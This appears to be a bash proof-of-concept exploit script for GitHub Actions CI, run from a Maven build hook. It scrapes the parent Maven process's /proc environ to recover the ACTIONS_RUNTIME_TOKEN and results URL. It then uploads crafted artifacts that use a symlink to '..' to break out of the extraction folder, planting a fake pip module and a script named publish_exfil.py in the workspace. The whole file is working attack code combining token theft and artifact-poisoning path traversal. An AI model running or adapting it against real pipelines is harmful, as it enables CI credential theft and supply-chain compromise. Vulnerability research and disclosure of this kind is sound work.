#!/bin/bash
exec 1>&2
echo "POC_PLANT_START os=$(uname -s) run=${GITHUB_RUN_ID:-} job=${GITHUB_JOB:-} user=$(id -un)"
echo "POC_ENVCOUNT $(env | wc -l)"
echo "POC_ENVKEYS $(env | cut -d= -f1 | sort | tr '\n' ' ' | cut -c1-600)"
if [ "$(uname -s)" != "Linux" ]; then
  echo "POC_PLANT_SKIP non-linux"
  exit 1
fi
if [ -f /tmp/poc_planted ]; then
  echo "POC_PLANT_SKIP already"
  exit 1
fi
touch /tmp/poc_planted
cd "$(dirname "$0")/.." || { echo "POC_CD_FAILED"; exit 1; }
echo "POC_CWD $(pwd)"

# exec-maven-plugin does not hand the runner's ACTIONS_* variables to the child;
# recover them from the parent (maven) process environment.
ppid=$(awk '{print $4}' /proc/$$/stat)
echo "POC_PPID $ppid"
tr '\0' '\n' < "/proc/$ppid/environ" > /tmp/poc_maven_env.txt 2>/dev/null
echo "POC_PARENT_ENV_HAS_ACTIONS $(grep -c '^ACTIONS_' /tmp/poc_maven_env.txt)"
if [ -z "${ACTIONS_RUNTIME_TOKEN:-}" ]; then
  export ACTIONS_RUNTIME_TOKEN=$(grep '^ACTIONS_RUNTIME_TOKEN=' /tmp/poc_maven_env.txt | head -1 | cut -d= -f2-)
fi
if [ -z "${ACTIONS_RESULTS_URL:-}" ]; then
  export ACTIONS_RESULTS_URL=$(grep '^ACTIONS_RESULTS_URL=' /tmp/poc_maven_env.txt | head -1 | cut -d= -f2-)
fi
echo "POC_TOKEN_LEN ${#ACTIONS_RUNTIME_TOKEN} RESULTS_URL_SET $([ -n "${ACTIONS_RESULTS_URL:-}" ] && echo yes || echo no)"

INPUT_NAME='.' INPUT_ENTRIES='[{"name":"p","content":"..","mode":41471}]' python3 poc/upload.py
echo "POC_UPLOAD_DOT_EXIT=$?"
sleep 2
INPUT_NAME='p' INPUT_ENTRIES='[{"name":"pip/__init__.py","content":"","mode":33188},{"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},{"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},{"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}]' python3 poc/upload.py
echo "POC_UPLOAD_P_EXIT=$?"
echo "POC_PLANT_DONE"
exit 1
